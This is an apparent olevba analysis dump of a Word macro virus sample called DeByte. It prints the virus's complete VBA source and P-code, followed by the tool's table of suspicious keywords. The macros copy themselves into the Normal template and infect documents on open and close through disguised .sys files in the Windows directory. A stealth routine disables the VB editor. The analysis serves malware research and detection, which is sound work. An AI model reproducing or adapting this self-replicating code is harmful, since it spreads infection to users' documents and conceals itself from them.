olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.DeByte
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.DeByte - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Infect_doc.bas 
in file: ./Virus.MSWord.DeByte - OLE stream: 'Macros/VBA/Infect_doc'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Sub Infect_doc()
Dim winda As String
Dim m(12)
winda = "                                                                           "
n = GetWindowsDirectory(winda, 255)
winda = Left$(winda, n)

Randomize (Timer)
z = 0
max = 8
min = 1
For I = 1 To max
    m(I) = 0
Next I

start:
c = Int((max + min - 1) * Abs(Rnd) + min)
For I = 1 To max
    If c = m(I) Then c = 100
Next I
If c <> 100 Then: z = z + 1: m(z) = c
If z < max Then GoTo start

For I = 1 To max
If m(I) = 1 Then ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv1.sys"
If m(I) = 2 Then ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv2.sys"
If m(I) = 3 Then ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv3.sys"
If m(I) = 4 Then ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv4.sys"
If m(I) = 5 Then ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv5.sys"
If m(I) = 6 Then ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv6.sys"
If m(I) = 7 Then ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv7.sys"
If m(I) = 8 Then ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv8.sys"
Next I
ActiveDocument.SaveAs
End Sub

-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.DeByte - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoClose()
Dim vir_test As Byte

vir_test = 0
For Each VbComponent In ActiveDocument.VBProject.VBComponents
    If VbComponent.Name = "Dead_Byte" Then vir_test = 255
Next
If vir_test = 255 Then GoTo V_ok
Call Infect_doc.Infect_doc
V_ok:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Dead_Byte.bas 
in file: ./Virus.MSWord.DeByte - OLE stream: 'Macros/VBA/Dead_Byte'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Dead_Byte()
   'http://www.deadbyte.narod.ru
   
End Sub
-------------------------------------------------------------------------------
VBA MACRO System.bas 
in file: ./Virus.MSWord.DeByte - OLE stream: 'Macros/VBA/System'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ViewVBCode(): Stealth: End Sub
Sub ToolsMacro(): Stealth: End Sub
Sub FileTemplates(): Stealth: End Sub
Private Sub Stealth(): On Error Resume Next
Application.ShowVisualBasicEditor = 0: Application.EnableCancelKey = 0
End Sub


-------------------------------------------------------------------------------
VBA MACRO infect_normal.bas 
in file: ./Virus.MSWord.DeByte - OLE stream: 'Macros/VBA/infect_normal'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Sub infect_normal()
Dim winda As String
Dim test_normal As Byte
test_normal = 0
winda = "                                                                           "
n = GetWindowsDirectory(winda, 255)
winda = Left$(winda, n)
ActiveDocument.VBProject.VBComponents("Dead_Byte").Export winda + "\wdrv1.sys"
ActiveDocument.VBProject.VBComponents("FileOpen").Export winda + "\wdrv2.sys"
ActiveDocument.VBProject.VBComponents("AutoOpen").Export winda + "\wdrv3.sys"
ActiveDocument.VBProject.VBComponents("AutoClose").Export winda + "\wdrv4.sys"
ActiveDocument.VBProject.VBComponents("FileClose").Export winda + "\wdrv5.sys"
ActiveDocument.VBProject.VBComponents("Infect_doc").Export winda + "\wdrv6.sys"
ActiveDocument.VBProject.VBComponents("Infect_normal").Export winda + "\wdrv7.sys"
ActiveDocument.VBProject.VBComponents("System").Export winda + "\wdrv8.sys"
For I = 1 To WordBasic.CountMacros(0, 0)
 If WordBasic.[MacroName$](I, 0, 0) = "Dead_Byte" Then test_normal = 255
Next I
If test_normal = 255 Then GoTo ok
WordBasic.MacroCopy WordBasic.[FileName$]() + ":Dead_Byte", "Normal:Dead_Byte"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileOpen", "Normal:FileOpen"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileClose", "Normal:FileClose"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Normal:AutoClose"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":Infect_doc", "Normal:Infect_doc"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":Infect_normal", "Normal:Infect_normal"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":System", "Normal:System"
ok:
End Sub


-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: ./Virus.MSWord.DeByte - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileOpen()
Dim vir_test As Byte
vir_test = 0
dialog_test = Dialogs(wdDialogFileOpen).Show
If dialog_test = 0 Then GoTo V_ok
For Each VbComponent In ActiveDocument.VBProject.VBComponents
    If VbComponent.Name = "Dead_Byte" Then vir_test = 255
Next
If vir_test = 255 Then GoTo V_ok
Call Infect_doc.Infect_doc
V_ok:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Autoopen.bas 
in file: ./Virus.MSWord.DeByte - OLE stream: 'Macros/VBA/Autoopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Autoopen()
Call infect_normal.infect_normal
End Sub

-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: ./Virus.MSWord.DeByte - OLE stream: 'Macros/VBA/FileClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileClose()
Dim vir_test As Byte

vir_test = 0
For Each VbComponent In ActiveDocument.VBProject.VBComponents
    If VbComponent.Name = "Dead_Byte" Then vir_test = 255
Next
If vir_test = 255 Then GoTo V_ok
Call Infect_doc.Infect_doc
V_ok:
WordBasic.FileClose
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.DeByte
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Infect_doc - 3028 bytes
' Line #0:
' 	FuncDefn (Private Declare Function GetWindowsDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #1:
' 	FuncDefn (Sub Infect_doc())
' Line #2:
' 	Dim 
' 	VarDefn winda (As String)
' Line #3:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x000C 
' 	VarDefn m
' Line #4:
' 	LitStr 0x004B "                                                                           "
' 	St winda 
' Line #5:
' 	Ld winda 
' 	LitDI2 0x00FF 
' 	ArgsLd GetWindowsDirectory 0x0002 
' 	St n 
' Line #6:
' 	Ld winda 
' 	Ld n 
' 	ArgsLd LBound$ 0x0002 
' 	St winda 
' Line #7:
' Line #8:
' 	Ld Timer 
' 	Paren 
' 	ArgsCall Read 0x0001 
' Line #9:
' 	LitDI2 0x0000 
' 	St z 
' Line #10:
' 	LitDI2 0x0008 
' 	St max 
' Line #11:
' 	LitDI2 0x0001 
' 	St min 
' Line #12:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld max 
' 	For 
' Line #13:
' 	LitDI2 0x0000 
' 	Ld I 
' 	ArgsSt m 0x0001 
' Line #14:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #15:
' Line #16:
' 	Label start 
' Line #17:
' 	Ld max 
' 	Ld min 
' 	Add 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	FnAbs 
' 	Mul 
' 	Ld min 
' 	Add 
' 	FnInt 
' 	St c 
' Line #18:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld max 
' 	For 
' Line #19:
' 	Ld c 
' 	Ld I 
' 	ArgsLd m 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0064 
' 	St c 
' 	EndIf 
' Line #20:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	Ld c 
' 	LitDI2 0x0064 
' 	Ne 
' 	If 
' 	BoS 0x0000 
' 	Ld z 
' 	LitDI2 0x0001 
' 	Add 
' 	St z 
' 	BoS 0x0000 
' 	Ld c 
' 	Ld z 
' 	ArgsSt m 0x0001 
' 	EndIf 
' Line #22:
' 	Ld z 
' 	Ld max 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo start 
' 	EndIf 
' Line #23:
' Line #24:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld max 
' 	For 
' Line #25:
' 	Ld I 
' 	ArgsLd m 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld winda 
' 	LitStr 0x000A "\wdrv1.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #26:
' 	Ld I 
' 	ArgsLd m 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld winda 
' 	LitStr 0x000A "\wdrv2.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #27:
' 	Ld I 
' 	ArgsLd m 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld winda 
' 	LitStr 0x000A "\wdrv3.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #28:
' 	Ld I 
' 	ArgsLd m 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld winda 
' 	LitStr 0x000A "\wdrv4.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #29:
' 	Ld I 
' 	ArgsLd m 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld winda 
' 	LitStr 0x000A "\wdrv5.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #30:
' 	Ld I 
' 	ArgsLd m 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld winda 
' 	LitStr 0x000A "\wdrv6.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #31:
' 	Ld I 
' 	ArgsLd m 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld winda 
' 	LitStr 0x000A "\wdrv7.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #32:
' 	Ld I 
' 	ArgsLd m 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld winda 
' 	LitStr 0x000A "\wdrv8.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #33:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' Macros/VBA/AutoClose - 1261 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Sub AutoClose())
' Line #2:
' 	Dim 
' 	VarDefn vir_test (As Byte)
' Line #3:
' Line #4:
' 	LitDI2 0x0000 
' 	St vir_test 
' Line #5:
' 	StartForVariable 
' 	Ld VbComponent 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #6:
' 	Ld VbComponent 
' 	MemLd New 
' 	LitStr 0x0009 "Dead_Byte"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x00FF 
' 	St vir_test 
' 	EndIf 
' Line #7:
' 	StartForVariable 
' 	Next 
' Line #8:
' 	Ld vir_test 
' 	LitDI2 0x00FF 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo V_ok 
' 	EndIf 
' Line #9:
' 	Ld Infect_doc 
' 	ArgsMemCall (Call) Infect_doc 0x0000 
' Line #10:
' 	Label V_ok 
' Line #11:
' 	EndSub 
' Macros/VBA/Dead_Byte - 898 bytes
' Line #0:
' 	FuncDefn (Sub Dead_Byte())
' Line #1:
' 	QuoteRem 0x0003 0x001C "http://www.deadbyte.narod.ru"
' Line #2:
' Line #3:
' 	EndSub 
' Macros/VBA/System - 1312 bytes
' Line #0:
' 	FuncDefn (Sub ViewVBCode())
' 	BoS 0x0000 
' 	ArgsCall Stealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #1:
' 	FuncDefn (Sub ToolsMacro())
' 	BoS 0x0000 
' 	ArgsCall Stealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #2:
' 	FuncDefn (Sub FileTemplates())
' 	BoS 0x0000 
' 	ArgsCall Stealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #3:
' 	FuncDefn (Private Sub Stealth())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' Line #4:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #5:
' 	EndSub 
' Line #6:
' Line #7:
' Macros/VBA/infect_normal - 3108 bytes
' Line #0:
' 	FuncDefn (Private Declare Function GetWindowsDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #1:
' 	FuncDefn (Sub infect_normal())
' Line #2:
' 	Dim 
' 	VarDefn winda (As String)
' Line #3:
' 	Dim 
' 	VarDefn test_normal (As Byte)
' Line #4:
' 	LitDI2 0x0000 
' 	St test_normal 
' Line #5:
' 	LitStr 0x004B "                                                                           "
' 	St winda 
' Line #6:
' 	Ld winda 
' 	LitDI2 0x00FF 
' 	ArgsLd GetWindowsDirectory 0x0002 
' 	St n 
' Line #7:
' 	Ld winda 
' 	Ld n 
' 	ArgsLd LBound$ 0x0002 
' 	St winda 
' Line #8:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv1.sys"
' 	Add 
' 	LitStr 0x0009 "Dead_Byte"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv2.sys"
' 	Add 
' 	LitStr 0x0008 "FileOpen"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv3.sys"
' 	Add 
' 	LitStr 0x0008 "AutoOpen"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #11:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv4.sys"
' 	Add 
' 	LitStr 0x0009 "AutoClose"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #12:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv5.sys"
' 	Add 
' 	LitStr 0x0009 "FileClose"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #13:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv6.sys"
' 	Add 
' 	LitStr 0x000A "Infect_doc"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #14:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv7.sys"
' 	Add 
' 	LitStr 0x000D "Infect_normal"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #15:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv8.sys"
' 	Add 
' 	LitStr 0x0006 "System"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	For 
' Line #17:
' 	Ld I 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0009 "Dead_Byte"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x00FF 
' 	St test_normal 
' 	EndIf 
' Line #18:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #19:
' 	Ld test_normal 
' 	LitDI2 0x00FF 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo ok 
' 	EndIf 
' Line #20:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x000A ":Dead_Byte"
' 	Add 
' 	LitStr 0x0010 "Normal:Dead_Byte"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #21:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	LitStr 0x000F "Normal:FileOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #22:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x000A ":FileClose"
' 	Add 
' 	LitStr 0x0010 "Normal:FileClose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #23:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	LitStr 0x0010 "Normal:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x000B ":Infect_doc"
' 	Add 
' 	LitStr 0x0011 "Normal:Infect_doc"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #25:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x000E ":Infect_normal"
' 	Add 
' 	LitStr 0x0014 "Normal:Infect_normal"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #26:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0007 ":System"
' 	Add 
' 	LitStr 0x000D "Normal:System"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #27:
' 	Label ok 
' Line #28:
' 	EndSub 
' Line #29:
' Line #30:
' Macros/VBA/FileOpen - 1341 bytes
' Line #0:
' 	FuncDefn (Sub FileOpen())
' Line #1:
' 	Dim 
' 	VarDefn vir_test (As Byte)
' Line #2:
' 	LitDI2 0x0000 
' 	St vir_test 
' Line #3:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	St dialog_test 
' Line #4:
' 	Ld dialog_test 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo V_ok 
' 	EndIf 
' Line #5:
' 	StartForVariable 
' 	Ld VbComponent 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #6:
' 	Ld VbComponent 
' 	MemLd New 
' 	LitStr 0x0009 "Dead_Byte"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x00FF 
' 	St vir_test 
' 	EndIf 
' Line #7:
' 	StartForVariable 
' 	Next 
' Line #8:
' 	Ld vir_test 
' 	LitDI2 0x00FF 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo V_ok 
' 	EndIf 
' Line #9:
' 	Ld Infect_doc 
' 	ArgsMemCall (Call) Infect_doc 0x0000 
' Line #10:
' 	Label V_ok 
' Line #11:
' 	EndSub 
' Macros/VBA/Autoopen - 863 bytes
' Line #0:
' 	FuncDefn (Sub Autoopen())
' Line #1:
' 	Ld infect_normal 
' 	ArgsMemCall (Call) infect_normal 0x0000 
' Line #2:
' 	EndSub 
' Line #3:
' Macros/VBA/FileClose - 1293 bytes
' Line #0:
' 	FuncDefn (Sub FileClose())
' Line #1:
' 	Dim 
' 	VarDefn vir_test (As Byte)
' Line #2:
' Line #3:
' 	LitDI2 0x0000 
' 	St vir_test 
' Line #4:
' 	StartForVariable 
' 	Ld VbComponent 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #5:
' 	Ld VbComponent 
' 	MemLd New 
' 	LitStr 0x0009 "Dead_Byte"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x00FF 
' 	St vir_test 
' 	EndIf 
' Line #6:
' 	StartForVariable 
' 	Next 
' Line #7:
' 	Ld vir_test 
' 	LitDI2 0x00FF 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo V_ok 
' 	EndIf 
' Line #8:
' 	Ld Infect_doc 
' 	ArgsMemCall (Call) Infect_doc 0x0000 
' Line #9:
' 	Label V_ok 
' Line #10:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #11:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.deadbyte.|URL                                          |
|          |narod.ru            |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

